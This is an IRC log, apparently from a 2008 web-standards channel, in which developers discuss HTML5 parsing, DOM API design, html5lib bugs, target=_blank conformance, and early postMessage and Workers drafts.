[17:37:00.0000] <Hixie>
which folder are you? :-)

[17:37:01.0000] <Hixie>
does dir="" always default to ltr?

[17:37:02.0000] <Dashiva>
Dunno, I just felt like saying it

[17:37:03.0000] <Hixie>
or is there a UA pref for the default?

[17:46:00.0000] <kingryan>
Hixie: I would suspect that that's based on locales

[23:50:00.0000] <hsivonen>
Hixie: re: NEL, please no

[23:51:00.0000] <hsivonen>
Reason: non-ASCII syntax-significant chars => bad

[00:16:00.0000] <annevk>
Hixie, parsing could use an update

[00:29:00.0000] <hsivonen>
webben++ http://www.w3.org/mid/47B1B887.7040205⊙gc

[03:07:00.0000] <annevk>
the DOM is so bloated :(

[03:07:01.0000] <annevk>
it's pretty sad

[03:07:02.0000] <annevk>
mostly because it's hard to change at this point

[03:10:00.0000] <hsivonen>
the DOM is very sad.

[03:11:00.0000] <hsivonen>
but the Attribute node thing might be changeable at this point

[03:11:01.0000] <hsivonen>
also getAttribute when the attribute is absent

[03:11:02.0000] <annevk>
so I was thinking about that

[03:11:03.0000] <annevk>
it seems to me that Attr is important because it has namespaceURI

[03:12:00.0000] <annevk>
so can we really change that?

[03:12:01.0000] <hsivonen>
do you mean enumerating the attributes instead querying one?

[03:13:00.0000] <annevk>
yeah

[03:16:00.0000] <annevk>
though maybe Attr could be changed in a way that it does not inherit from Node

[03:17:00.0000] <annevk>
because Note is fricking bloated

[03:17:01.0000] <annevk>
s/Note/Node/

[03:18:00.0000] <hsivonen>
it would be interesting to know if Attr is in practice used by any scripts except serializers

[03:18:01.0000] <hsivonen>
do Ajax libraries do that kind of looping over all attributes?

[03:22:00.0000] <annevk>
element.attributes is used I think

[03:56:00.0000] <annevk>
hsivonen, btw, do you have a list of things where the DOM assumes UTF-16?

[03:57:00.0000] <hsivonen>
annevk: I don't.

[03:58:00.0000] <hsivonen>
annevk: perhaps saying that the DOM requires it misses the point. it's JavaScript strings that assume 16-bit units

[03:59:00.0000] <harri>
DOM Range is a place where utf-16 is assumed

[03:59:01.0000] <annevk>
thanks

[04:00:00.0000] <annevk>
i think i'll raise this with the SVG WG

[04:00:01.0000] <annevk>
Opera does "UTF-16 units" for getNumberOfChars() and I think it makes sense to keep it that way

[04:00:02.0000] <annevk>
and not have a slightly different API just for SVG

[04:15:00.0000] <gsnedders>
hmm, Zs doesn't include u0009–u000D

[04:22:00.0000] <annevk>
http://lists.w3.org/Archives/Public/www-svg/2008Feb/0017.html

[05:21:00.0000] <hsivonen>
was there someone on this channel working on Comet stuff?

[05:22:00.0000] <annevk>
at some point

[05:39:00.0000] <annevk>
man, who uses nodeiterator anyway?

[05:39:01.0000] <annevk>
complex :(

[05:41:00.0000] <annevk>
and not just a little bit

[06:03:00.0000] <hsivonen>
should OPTIONS on a non-existent URI path return 404?

[06:04:00.0000] <hsivonen>
presumably yes

[06:06:00.0000] <annevk>
as in, a non-existent GET URI path?

[06:08:00.0000] <hsivonen>
annevk: yes

[06:08:01.0000] <hsivonen>
annevk: if the URI would be 404 on GET or POST

[06:09:00.0000] <annevk>
either that or maybe METHOD NOT ALLOWED (405 or so?)

[06:11:00.0000] <gsnedders>
the method is allowed thoguh

[06:11:01.0000] <gsnedders>
*though

[06:11:02.0000] <gsnedders>
so that status code can't be used

[06:30:00.0000] <annevk>
Hixie, where in DOM Level 2 Traversal is it defined what to do with incorrect return values for filters? Such as 'true' and 'false'?

[06:36:00.0000] <hsivonen>
something tells me Dmitry Turin hasn't paid good attention to what others (Hixie in particular) have written on public-html

[06:37:00.0000] <annevk>
i always forget to bookmark those posts for reuse as I expect people to understand...

[07:45:00.0000] <hsivonen>
I wonder if access-control is *now* stable enough to implement in Validator.nu...

[07:49:00.0000] <hsivonen>
annevk: surely the GET algorithm should apply to HEAD as well

[07:49:01.0000] <hsivonen>
in access-control

[07:53:00.0000] <annevk>
I'm not sure how I far I want to open that door

[07:54:00.0000] <hsivonen>
hmm. looks like Gecko source now has OPTIONS but still the Method-Check stuff

[07:54:01.0000] <hsivonen>
/me implements per spec

[07:58:00.0000] <annevk>
hsivonen, I'd wait for Firefox 3 to ship

[07:59:00.0000] <hsivonen>
annevk: do you expect changes to the single-URI policy version?

[08:04:00.0000] <gsnedders>
"from xxx import *" works fine as a normal import in Python, but how can you deal with such a thing when the module is bound to a variable?

[08:05:00.0000] <Philip`>
/me wonders why #dom li:last-child::before doesn't work right in Firefox

[08:05:01.0000] <gsnedders>
jgraham__: maintaining backwards compat. is harder than I thought, because everything refers to specific classes/functions in the dom treebuilder

[08:09:00.0000] <Philip`>
Oh, it does work right in Firefox once you make it reflow or something

[08:17:00.0000] <hsivonen>
hrm. OPTIONS * seems like a useless complication that doesn't have an upside

[08:20:00.0000] <hsivonen>
annevk: access-control could use a companion guide for server-side devs

[08:33:00.0000] <annevk>
hsivonen, I hope on no changes whatsoever

[08:33:01.0000] <annevk>
however, I have hoped that for the past year

[08:37:00.0000] <annevk>
hsivonen, OPTIONS *? I'll remind you that you argued for using OPTIONS too :)

[08:38:00.0000] <hsivonen>
annevk: yeah, OPTIONS is the right way to go, but OPTIONS * is still an unnecessary complication in RFC 2616

[08:39:00.0000] <hsivonen>
annevk: I've now deployed access-control on v.nu

[08:39:01.0000] <annevk>
have fun

[08:40:00.0000] <hsivonen>
annevk: but it seems that OPTIONS * stuff never reaches the servlet

[08:40:01.0000] <hsivonen>
not a problem. just weird

[08:40:02.0000] <hsivonen>
and useless

[08:41:00.0000] <hsivonen>
oops. And I broke html5.validator.nu and parsetree.validator.nu, it seems

[08:42:00.0000] <annevk>
that promises something for when less competent people start doing this :(

[08:43:00.0000] <hsivonen>
annevk: that's not related to handling options. it is another "fix" in the same checkout

[08:57:00.0000] <hsivonen>
fixed

[08:58:00.0000] <gsnedders>
/me sighs, thinking his change to html5lib is finally working

[08:58:01.0000] <gsnedders>
Now, to commit.

[09:00:00.0000] <gsnedders>
/me isn't sure if he ever has actually commited before, even though he's had perms for a while

[09:22:00.0000] <zcorpan>
so the main reasons people use Transitional seems to be (1) be able to use target=_blank and (2) using software that emits markup that only validates as transitional (also mainly due to target=_blank)

[09:54:00.0000] <webben>
zcorpan: Isn't iframe also a factor?

[09:55:00.0000] <webben>
(a major factor, I mean)

[09:56:00.0000] <zcorpan>
webben: less so than target=_blank, it seems. however, iframe is already valid html5

[09:56:01.0000] <hsivonen>
zcorpan: is this based on 10 answers to the sitepoint survey?

[09:57:00.0000] <zcorpan>
hsivonen: yes, and the comments

[09:59:00.0000] <zcorpan>
s/people/people who are on sitepoint and read the thread and care enough to vote or comment/

[10:08:00.0000] <gsnedders>
ergh.

[10:08:01.0000] <gsnedders>
html5lib relies on minidom's brokenness.

[10:10:00.0000] <Philip`>
http://philip.html5.org/tools/parser/

[10:11:00.0000] <Philip`>
Currently missing quite a few bits (especially anything to do with CDATA or RCDATA etc) but generally it seems to work

[10:11:01.0000] <gsnedders>
Philip`: that your JS impl?

[10:11:02.0000] <Philip`>
Yes

[10:14:00.0000] <gsnedders>
<http://code.google.com/p/html5lib/source/browse/trunk/python/src/html5lib/treebuilders/dom.py#97> — why do we set a readonly property?

[10:16:00.0000] <Philip`>
It's irritating that the DOM interface doesn't let you create as many DOMs as an XML parser or HTML parser can

[10:17:00.0000] <gsnedders>
Philip`: huh?

[10:17:01.0000] <gsnedders>
we set that readonly property to work around a bug in minidom, seemingly

[10:20:00.0000] <Philip`>
Oh, I suppose for ownerDocument you can just pass the doctype into createDocument and it'll work alright, so maybe you can do as much as an XML parser

[10:20:01.0000] <Philip`>
(but it's still not possible to write a proper HTML5 parser in JS because the DOM won't let you create elements and attributes with funny names)

[10:22:00.0000] <zcorpan>
Philip`: that's really useful

[10:23:00.0000] <gsnedders>
/me wonders how else to work around that bug in minidom

[10:23:01.0000] <Philip`>
gsnedders: Why does the current workaround not work?

[10:24:00.0000] <zcorpan>
Philip`: are you catching invalid names for attributes?

[10:24:01.0000] <gsnedders>
Philip`: if you aren't using minidom, and you're using something that enforces the readonly-ness of the property, it breaks

[10:24:02.0000] <gsnedders>
How can I check if "Dom" is the module xml.dom.minidom?

[10:24:03.0000] <Philip`>
gsnedders: If the minidom bug doesn't affect any other DOMs, you could perhaps wrap the property-setting line in try/except and ignore failures

[10:25:00.0000] <gsnedders>
Philip`: the exception raised depends on what impl you're using, though

[10:27:00.0000] <zcorpan>
Philip`: is <foo:bar> handled correctly?

[10:27:01.0000] <Philip`>
zcorpan: Oops, I wasn't checking attributes - fixed now

[10:28:00.0000] <Philip`>
zcorpan: Depends on what you mean by "correctly"

[10:28:01.0000] <zcorpan>
Philip`: local name "foo:bar" rather than "bar"

[10:29:00.0000] <gsnedders>
zcorpan: some DOM's don't allow attributes to be created containing with a ":"

[10:29:01.0000] <Philip`>
zcorpan: It just does createElementNS('http://www.w3.org/1999/xhtml', 'foo:bar'), which seems to work with localName correctly

[10:29:02.0000] <zcorpan>
gsnedders: the w3c dom does

[10:30:00.0000] <gsnedders>
s/'//

[10:30:01.0000] <zcorpan>
Philip`: i think that ends up being a "bar" element

[10:30:02.0000] <Philip`>
s/work/not work/

[10:30:03.0000] <Philip`>
I agree now :-)

[10:30:04.0000] <Philip`>
<foo:p><p> gets parsed wrongly

[10:30:05.0000] <Philip`>
(because my code just tests localName)

[10:30:06.0000] <gsnedders>
zcorpan: I get a "foo:bar" in Saf3

[10:31:00.0000] <Philip`>
/me wonders how he should fix that

[10:32:00.0000] <zcorpan>
Philip`: either createElement() or throw when there are colons

[10:32:01.0000] <Philip`>
zcorpan: Could createElement work when I want these things to be in the HTML namespace?

[10:33:00.0000] <zcorpan>
Philip`: if the browser puts them in the html namespace then yes :)

[10:35:00.0000] <Philip`>
Why would it put them in the HTML namespace, when they're not being added into an existing HTML document?

[10:36:00.0000] <zcorpan>
ah. hmm. perhaps because dom5 core will require it? :)

[10:36:01.0000] <Philip`>
document.implementation.createDocument('a', 'b', null).createElement('foo:bar').namespaceURI only works in Opera :-(

[10:40:00.0000] <zcorpan>
Philip`: how come <foo:p><p> and <foo:a><a> are different?

[10:48:00.0000] <Philip`>
zcorpan: <foo:a> doesn't get added to the list of active elements, since it's not an "a" start tag, and so the <a> doesn't realise there's already an active "a"

[10:48:01.0000] <Philip`>
where <foo:p> does get added to the stack of open elements, and so the <p> does think there's already a "p"

[10:51:00.0000] <Philip`>
zcorpan: I've updated it to distrust anything that's not /^[a-zA-Z_][a-zA-Z0-9_.-]*$/, which will hopefully avoid those problems

[10:53:00.0000] <zcorpan>
Philip`: that seems a bit harsh

[10:53:01.0000] <zcorpan>
are there other characters than the colon that are problematic?

[10:54:00.0000] <Philip`>
zcorpan: Anything that's not an XML Name should cause an exception

[10:54:01.0000] <zcorpan>
Philip`: yeah, but it did that before too, no?

[10:55:00.0000] <zcorpan>
(modulo browser bugs)

[10:55:01.0000] <Philip`>
It used to cause an exception and then catch it and get rid of anything that's /[^a-zA-Z_]/

[10:55:02.0000] <Philip`>
(except in browsers that failed to throw the exception)

[10:56:00.0000] <Philip`>
(in which case it'd act inconsistently with other browsers, which is probably undesirable)

[10:57:00.0000] <zcorpan>
well, i guess there are few valid reasons to use <embed ☺> anyway

[10:57:01.0000] <Philip`>
Or maybe I should just use createElement and forget about the namespace thing, at least for the DOM-viewer version

[10:57:02.0000] <zcorpan>
sounds reasonable

[10:58:00.0000] <Philip`>
except that shouldn't help because createElement and setAttribute should still throw exceptions if it's not an XML Name

[10:58:01.0000] <zcorpan>
it solves the colon problem

[10:58:02.0000] <Philip`>
(and the only difference is it doesn't have to be a QName)

[10:59:00.0000] <zcorpan>
and that createElement() takes local name as input rather than qname

[11:02:00.0000] <Philip`>
zcorpan: Okay, I've changed it to just use createElement by default, and to be more permissive about characters

[11:04:00.0000] <Philip`>
(It accepts /^[a-zA-Z:_][a-zA-Z0-9:_.-]*$/, else it gets rid of all /[^a-zA-Z_]/)

[11:04:01.0000] <zcorpan>
why not check against the Name production?

[11:04:02.0000] <Philip`>
Because that seems long and complex and not very useful

[11:05:00.0000] <zcorpan>
ok, why not let the browser throw then?

[11:06:00.0000] <Philip`>
Because then it'll give different output in different browsers (depending on the browser's bugs), which will be a little confusing

[11:09:00.0000] <zcorpan>
but testing nonascii or random junk is useful

[11:10:00.0000] <zcorpan>
/me is off for food

[11:10:01.0000] <Hixie>
"Either they continue to use HTML4 Transitional, or they stop to care about conformance, or they use

[11:10:02.0000] <Hixie>
scripts to insert the target attribute or use window.open().

[11:10:03.0000] <Hixie>
"

[11:10:04.0000] <Hixie>
the last two options are the same as the second option

[11:11:00.0000] <Philip`>
"the stop to care about the output of conformance checkers"

[11:11:01.0000] <Philip`>
s//y/

[11:12:00.0000] <Hixie>
conformance checkers should check script too

[11:13:00.0000] <Hixie>
would be interesting to write a conformance checker that supported rewinding

[11:13:01.0000] <Hixie>
that just went down every branch

[11:13:02.0000] <Hixie>
checking arguments to every method, etc

[11:14:00.0000] <Philip`>
Bonus points if it doesn't take infinite time

[11:14:01.0000] <Hixie>
well obviously it wouldn't check everything

[11:15:00.0000] <Hixie>
but you could catch a number of simple things

[11:16:00.0000] <Philip`>
So some well-intentioned person will write some obfuscated code that opens windows in a way the conformance checker can't detect, and then other well-intentioned people will copy-and-paste that so that their pages validate successfully

[11:16:01.0000] <Hixie>
and they'll get a warning "warning: script could not be verified"

[11:17:00.0000] <Hixie>
if people want to ignore a validator, why would they use a validator?

[11:17:01.0000] <Philip`>
They'll ignore those warnings because every non-trivial script will give that warning

[11:17:02.0000] <Hixie>
i think most people don't realise that setting target from script is non-conforming

[11:19:00.0000] <Philip`>
It's hard enough trying to decide that some code will always terminate, without always giving up and saying "can't verify code"

[11:24:00.0000] <Hixie>
i'm just sayin', it'd be useful

[11:24:01.0000] <Philip`>
Many impossible things would be useful :-)

[11:24:02.0000] <Philip`>
s/impossible/hard/

[11:25:00.0000] <weinig>
annevk: just to update you on what olliej mentioned last night

[11:25:01.0000] <weinig>
annevk: I am in the process of implementing the new postMessage

[11:26:00.0000] <weinig>
annevk: it has not landed yet though

[11:26:01.0000] <gsnedders>
Hixie: can you fix the occurrence of title"" in source?

[11:38:00.0000] <Hixie>
gsnedders: i thought i had

[11:39:00.0000] <gsnedders>
Hixie: oh, wait. I doing this from a local copy.

[11:39:01.0000] <gsnedders>
/me looks at the current copy

[11:39:02.0000] <gsnedders>
yeah, it's fixed.

[11:39:03.0000] <Hixie>
k

[11:40:00.0000] <gsnedders>
/me is too tired

[11:41:00.0000] <gsnedders>
Hixie: for the cross-referencing (per HTML 5) should I do any normalisation (of whitespace? of Unicode? or case?) before calculating cross references?

[11:42:00.0000] <Hixie>
space characters should go to one space, yeah

[11:42:01.0000] <Hixie>
several of the title attributes and element contents span multiple lines

[11:42:02.0000] <gsnedders>
currently the spec says it must be exactly identical

[11:43:00.0000] <gsnedders>
Hixie: (I mean in the HTML 5 def of dfn)

[11:43:01.0000] <Hixie>
probably best to normaline case too

[11:43:02.0000] <Hixie>
yeah that's all gonna be dropped i think

[11:43:03.0000] <gsnedders>
ah.

[11:46:00.0000] <gsnedders>
/me notes that on his private playing around copy that actually processing the DOM is now slower than parsing

[11:47:00.0000] <Philip`>
import psyco

[11:47:01.0000] <Philip`>
Makes things much faster!

[11:48:00.0000] <gsnedders>
/me ponders

[11:48:01.0000] <gsnedders>
/me expands graph

[11:48:02.0000] <gsnedders>
Okay, that isn't good.

[11:49:00.0000] <gsnedders>
Python is definitely too slow. That sucks.

[11:49:01.0000] <Philip`>
You could use Java

[11:50:00.0000] <gsnedders>
I know no Java, which is a slight issue.

[11:50:01.0000] <Hixie>
python is slow, generally, but i wouldn't bet on python's speed being the gating factor unless you're making a ray tracer or something

[11:51:00.0000] <gsnedders>
Hixie: or maybe `cat header_whatwg source` is too big for a python spec-gen :)

[11:51:01.0000] <Hixie>
shouldn't be

[11:51:02.0000] <Hixie>
i mean, the overhead isn't going to be _that_ big, regardless of what language you use

[11:52:00.0000] <Hixie>
(the spec splitter is a python script, e.g.)

[11:53:00.0000] <zcorpan_>
Hixie: ok, s/conformance/validating their documents/

[11:54:00.0000] <gsnedders>
/me thinks he could try doing this another way, actually

[11:54:01.0000] <zcorpan_>
Hixie: also, window.open() isn't non-conforming, is it?

[11:54:02.0000] <Hixie>
zcorpan_: window.open with _blank is

[11:54:03.0000] <Hixie>
iirc

[11:54:04.0000] <zcorpan_>
window.open(url) works

[11:55:00.0000] <Hixie>
iirc that's non-conforming

[11:55:01.0000] <Hixie>
oh, i guess it's not explicitly non-conforming

[11:55:02.0000] <Hixie>
oh well

[11:55:03.0000] <Hixie>
anyway i think you're right, and _blank will just have to be made valid. we'll just have to make it optional to implement instead.

[11:56:00.0000] <gsnedders>
/me thinks he'll be able to do it in a more memory expensive way

[11:56:01.0000] <zcorpan_>
makes sense

[11:56:02.0000] <gsnedders>
(but the overhead is still not that big)

[11:56:03.0000] <Hixie>
zcorpan_: any time the spec requires opening a new top-level browsing context, i think the current one should be selected instead

[11:56:04.0000] <Hixie>
zcorpan_: i'm getting more and more annoyed by sites that decide when i'm opening a page in a new tab

[11:57:00.0000] <Hixie>
and since all i have is a spec-hammer, all problems look like spec-nails to me

[11:57:01.0000] <zcorpan_>
Hixie: yeah, but that's configurable in the browser

[11:57:02.0000] <bradee-oh>
Hixie: weinig has a question for you (and he's a pansy)

[11:57:03.0000] <Hixie>
not currently, but yeah

[11:57:04.0000] <Hixie>
bradee-oh: brt

[11:58:00.0000] <zcorpan_>
Hixie: using the spec-hammer doesn't stop sites opening new windows, it just makes it harder to configure because it becomes an arms race

[11:58:01.0000] <gsnedders>
jgraham__: ping

[11:58:02.0000] <Hixie>
zcorpan_: yeah

[11:58:03.0000] <weinig>
Hixie: hey, we were just curious what an <ihost> refers to?

[11:59:00.0000] <Hixie>
weinig: same as <host>, but for IRIs

[11:59:01.0000] <weinig>
Hixie: ah, ok

[11:59:02.0000] <Hixie>
weinig: did i use it in a paragraph without a reference?

[11:59:03.0000] <gsnedders>
Hixie: in Resource metadata management

[12:00:00.0000] <Hixie>
oops

[12:00:01.0000] <Hixie>
someone send mail :-)

[12:00:02.0000] <gsnedders>
weinig: can you?

[12:00:03.0000] <weinig>
gsnedders: sure

[12:01:00.0000] <weinig>
Hixie: I will also send mail regarding this, but, is postMessage supposed to work with file: urls?

[12:01:01.0000] <gsnedders>
(i.e., not the guy who pointed out where it was, but the one who found it)

[12:01:02.0000] <Hixie>
weinig: basically, anything involving file: URIs is not my concern, since you don't need interop for anything that's using file: URIs. so it's up to you.

[12:01:03.0000] <Hixie>
weinig: but generally i would say i guess it would work, but origin would be null

[12:02:00.0000] <weinig>
/me nods

[12:02:01.0000] <gsnedders>
Hixie: when replacing spaces for x-refs, what space characters should be done? just ASCII ones?

[12:04:00.0000] <Hixie>
i'd just do whatever falls under the "space character" definition in html5

[12:04:01.0000] <gsnedders>
k.

[12:04:02.0000] <Hixie>
but for me, it just needs to be space and linefeed

[12:04:03.0000] <gsnedders>
all "me" Hixie :)

[12:13:00.0000] <gsnedders>
/me doesn't particually want to commit this to html5lib because he expects he'll be shot for it

[13:03:00.0000] <jgraham__>
gsnedders: I'm kinda here

[13:04:00.0000] <gsnedders>
jgraham__: would I be shot if I committed a "except Exception"?

[13:04:01.0000] <gsnedders>
specifically, to work around a bug in minidom

[13:04:02.0000] <jgraham__>
No, well you would unless you just write except: (no need for the Exception bit) :)

[13:05:00.0000] <jgraham__>
gsnedders: Yeah, that seems like a reasonable use case

[13:05:01.0000] <jgraham__>
(I read the logs earlier)

[13:05:02.0000] <gsnedders>
the exact exception depends on the DOM impl, as I said

[13:06:00.0000] <jgraham__>
Yeah, the alternative (if Dom == xml.dom.minidom) seems just as bad

[13:10:00.0000] <gsnedders>
jgraham__: and should I add pxdom to the parser tests even though one test fails, due to a bug in pxdom?

[13:11:00.0000] <jgraham__>
gsnedders: Yeah, for sure. But email html5lib-discuss⊙gc explaining why the test fails

[13:11:01.0000] <gsnedders>
k

[13:11:02.0000] <gsnedders>
(I've already emailed the author of pxdom about the bug, fwiw)

[13:15:00.0000] <jgraham__>
gsnedders: Have you looked at making multiple dom imps work with treewalkers

[13:16:00.0000] <gsnedders>
jgraham__: I haven't yet tried, but a quick look at the code made me think it would work

[13:16:01.0000] <jgraham__>
Yeah, I don't know how much woulkd need to be changed. Maybe just adding pyxdom to the tests

[13:17:00.0000] <gsnedders>
jgraham__: what file would they need to be added in for that?

[13:17:01.0000] <gsnedders>
test_treewalkers.py?

[13:18:00.0000] <jgraham__>
tests/testtreewalkers.py

[13:18:01.0000] <jgraham__>
yeah.

[13:19:00.0000] <annevk>
thanks weinig

[13:22:00.0000] <gsnedders>
jgraham__: yeah, it works fine with the DOM treewalker.

[13:22:01.0000] <gsnedders>
(pending the other bug that comes up again)

[13:22:02.0000] <jgraham__>
Great

[13:29:00.0000] <gsnedders>
I think I'll send a general email about what I've done

[13:41:00.0000] <gsnedders>
/me commits and sends email

[13:45:00.0000] <Hixie>
updated http://www.hixie.ch/specs/dom/messages/0.9

[13:48:00.0000] <annevk>
could you add some rational etc?

[13:49:00.0000] <annevk>
it's not really clear to me what problem it's trying to solve

[13:51:00.0000] <Hixie>
rationale, you mean?

[13:51:01.0000] <Hixie>
sure

[13:52:00.0000] <annevk>
yeah

[14:28:00.0000] <Hixie>
it would be interesting to have a .reply() API for the postMessage() stuff

[14:39:00.0000] <aroben>
Hixie: in, e.g., step 2.4 of the postMessage() algorithm, does "these steps" mean the substeps of step 2 or all the steps of the algorithm?

[14:39:01.0000] <aroben>
Hixie: I assume the latter

[14:45:00.0000] <Hixie>
all of them


2008-02-14
[16:29:00.0000] <Hixie>
well bummer

[16:29:01.0000] <Hixie>
/me ends up speccing an event that fires on garbage collection

[16:29:02.0000] <Hixie>
that's clearly not a good plan

[16:32:00.0000] <Dashiva>
Very interoperable, no doubt :)

[16:34:00.0000] <Philip`>
Would it be non-conforming to just leak memory and not do GC?

[16:34:01.0000] <Hixie>
so here's the problem

[16:34:02.0000] <Dashiva>
You'd still be firing it every time you did GC, so it should be conforming

[16:35:00.0000] <Hixie>
this is for http://www.hixie.ch/specs/dom/messages/0.9

[16:35:01.0000] <Hixie>
what should happen if i create an end point, set its message handler, and then forget about my end of it, having passed the other end to another browsing context?

[16:35:02.0000] <Hixie>
clearly it shouldn't be garbage collected

[16:36:00.0000] <Hixie>
as it can still receive messages and respond usefully

[16:36:01.0000] <Hixie>
but then what happens if my Window is closed?

[16:36:02.0000] <Hixie>
or navigated?

[16:37:00.0000] <Dashiva>
Is the strong entangling really needed?

[16:37:01.0000] <Hixie>
should the other side get an unload event for the endpoint?

[16:37:02.0000] <Hixie>
how do you mean?

[16:37:03.0000] <Dashiva>
Instead of just having each endpoint have an "other end" property referring to the other endpoint

[16:38:00.0000] <Hixie>
i don't understand

[16:39:00.0000] <Dashiva>
Um. Well, could you treat it the same way any old DOM reference in a different window?

[16:40:00.0000] <Dashiva>
With window references you have .closed, could something similar work for endpoints?

[16:40:01.0000] <Hixie>
i can set .active to false

[16:44:00.0000] <Dashiva>
The problematic event was something like "other endpoint is gone"?

[16:44:01.0000] <Hixie>
i think i've worked out how to spec it for now

[16:44:02.0000] <Hixie>
we'll see if it handles Workers too in a second

[16:45:00.0000] <Dashiva>
What's the reason for cloning endpoints sent via postMessage, by the way?

[16:45:01.0000] <Hixie>
cross-origin concerns

[16:47:00.0000] <Hixie>
for example, it would be bad if you could do foreignEndPoint.prototype.prototype.toString = function () { my evil function }

[16:47:01.0000] <Hixie>
or whatever

[16:48:00.0000] <Dashiva>
So the create function is usually making one just to throw it away later

[16:48:01.0000] <Hixie>
yep

[16:49:00.0000] <Dashiva>
I feel like it should be possible to do it the other way around, creating just one endpoint and having the semantics of send be "The endpoint received should be a new one entangled with this here local endpoint I have"

[16:49:01.0000] <Hixie>
what if you do it twice?

[16:50:00.0000] <Hixie>
also, you might want to pass the same end point down several pipes

[16:50:01.0000] <Hixie>
which you couldn't do the way you describe it

[16:51:00.0000] <Dashiva>
Aren't those two things mutually exclusive?

[16:51:01.0000] <Hixie>
hm?

[16:51:02.0000] <Dashiva>
If you want to pass it down several pipes, you are doing it twice (or more)

[16:52:00.0000] <Hixie>
say you have established pipes A1<->A2 and B1<->B2, and a newly created pipe C1<->C2.

[16:52:01.0000] <Hixie>
right now you can pass C2 down from A1 to A2, and then from there it can go from B1 to B2

[16:52:02.0000] <Hixie>
but your proposal can't do that, as i understand it

[16:53:00.0000] <Hixie>
however, your proposal would allow sending "C1's other point" down A1 to A2 creating C2, and then sending "C1's other point" again down A1 to A2, creating C2'?

[16:53:01.0000] <Hixie>
so now you have two C2s

[16:54:00.0000] <Hixie>
which is confusing

[16:54:01.0000] <Hixie>
and causes all kinds of problems

[16:54:02.0000] <Dashiva>
Let me work this out. So you pass C2 from A1 to A2, which gives A2 a C3 connected to C1. Then you pass C3 from B1 to B2, giving B2 a C4 which is connected to C1. In the process you've invalidated C2 and C3.

[16:55:00.0000] <Hixie>
yah

[16:55:01.0000] <Hixie>
(i'd prefer the notation C2, C2', C2'', C2''', but sure :-) )

[16:56:00.0000] <Dashiva>
Yeah, I see my idea wouldn't support chaining

[16:57:00.0000] <Dashiva>
(Unless the endpoint included a pointer to its twin)

[16:57:01.0000] <Dashiva>
And that's what the cloning was supposed to stop

[16:58:00.0000] <Hixie>
yeha

[16:58:01.0000] <Hixie>
yeah, even

[16:59:00.0000] <Dashiva>
So I suppose I'd be writing function setupLink(w) { p = new Pair(); w.postMessage("New pair",p.two); return p.one; } or somesuch then

[17:19:00.0000] <Hixie>
hmmmmm

[17:19:01.0000] <Hixie>
workers have to die if no browsing contexts refer to them

[17:19:02.0000] <Hixie>
not just if nobody refers to them

[17:19:03.0000] <Hixie>
otherwise you could have a worker refer to another and vice versa

[17:19:04.0000] <Hixie>
and they'd keep each other alive

[17:33:00.0000] <Lachy>
I don't know how to address this comment for selectors api http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0000.html

[17:34:00.0000] <Hixie>
hm, i wrote that text

[17:34:01.0000] <Hixie>
or suggested it originally

[17:34:02.0000] <Hixie>
let's see

[17:34:03.0000] <Lachy>
I can't figure out how to rephrase it to make it clearer

[17:34:04.0000] <Hixie>
yeah

[17:34:05.0000] <Hixie>
User agents should ensure that they do not crash or behave erratically when facing...

[17:35:00.0000] <Lachy>
that might work

[17:35:01.0000] <Hixie>
... For example, a user agent could apply a timeout to the NSResolver callback.

[17:35:02.0000] <Lachy>
but then I'm not totally convinced of the value of having that in there at all, since the same applies to all scripts

[17:36:00.0000] <Hixie>
well, the difference here is that the script is driving a UA algorithm

[17:36:01.0000] <Hixie>
i could easily imagine implementations of the algorithm where returning inconsistent results would cause a crash

[17:36:02.0000] <Hixie>
this is just saying, "beware"

[17:36:03.0000] <Hixie>
which is all security sections ever say, really

[17:36:04.0000] <Lachy>
ok

[17:37:00.0000] <Hixie>
but i can easily imagine someone not thinking about the fact that the resolver might hang, and accidentally not putting the usual scripting timeout constraints around that api

[17:37:01.0000] <Hixie>
same with changing the dom

[17:44:00.0000] <Hixie>
http://www.w3.org/2001/tag/doc/passwordsInTheClear-52

[17:45:00.0000] <Hixie>
"User agents SHOULD use password masking when passwords are displayed in an HTML form"

[17:45:01.0000] <Hixie>
i'm so glad the TAG is addressing critical unsolved problems

[17:45:02.0000] <Hixie>
and not, say, problems from 1993

[17:53:00.0000] <Hixie>
http://www.hixie.ch/specs/dom/workers/0.9 is finally ready for broader review

[18:18:00.0000] <roc>
the recursive definition of "acceptable" is a bit dogy

[18:19:00.0000] <roc>
a cycle of WorkerWindows talking to each other but disconnected from all real Windows could be deemed "acceptable", and could also be deemed "not acceptable"

[18:21:00.0000] <roc>
you also need to say something about what's in scope for these worker threads

[18:22:00.0000] <roc>
oh I see you've got a one-line comment covering that :-)

[18:27:00.0000] <Lachy>
is createWorker*() designed to make it possible to run JS as a separate thread in the background?

[18:27:01.0000] <roc>
yes

[18:27:02.0000] <Lachy>
cool

[18:27:03.0000] <roc>
a la Gears

[19:08:00.0000] <Hixie>
roc: yeah, i thought of that when i defined it (the 'acceptable' thing). i was hoping it would go unnoticed.

[19:08:01.0000] <Hixie>
fat chance of that, apparently :-)

[19:08:02.0000] <Hixie>
roc: any idea how to better phrase it?

[19:09:00.0000] <roc>
something like

[19:09:01.0000] <roc>
"Acceptability is defined inductively by the following rules:"

[19:09:02.0000] <Hixie>
(these two proposals are very much early early drafts, by the way, hey'll obviously be defined more rigorously if they ever make a real spec)

[19:10:00.0000] <Hixie>
roc: is that magic phrasing that makes it better? awesome

[19:10:01.0000] <Hixie>
/me edits

[19:10:02.0000] <roc>
no

[19:10:03.0000] <roc>
"1. <a thread with an endpoint whose other end is a real Window, is acceptable>"

[19:10:04.0000] <Hixie>
oh, there's more, ok

[19:10:05.0000] <Hixie>
/me waits

[19:10:06.0000] <roc>
"2. <a thread with an endpoint whose other end is an acceptable thread, is acceptable>"

[19:10:07.0000] <roc>
but yeah, "induction" is actually a magic word here :-)

[19:11:00.0000] <roc>
you might find it useful to take a class or read a book on methods for formal specification

[19:12:00.0000] <roc>
a lot of it's less useful than its practitioners wish

[19:12:01.0000] <roc>
but you might pick up some useful stuff anyway

[19:12:02.0000] <Hixie>
yeah, i try to read up on stuff like that occasionally

[19:12:03.0000] <Hixie>
do you have any suggestions?

[19:12:04.0000] <Hixie>
there's a lot of... less than readable material

[19:12:05.0000] <roc>
yeah

[19:12:06.0000] <Hixie>
that's either way over my head, or bogus

[19:12:07.0000] <Hixie>
i can't tell

[19:14:00.0000] <roc>
I'll ask my old PhD advisor(s), they're into this sort of thing

[19:15:00.0000] <Hixie>
cool

[19:15:01.0000] <Hixie>
that would be awesome

[19:16:00.0000] <roc>
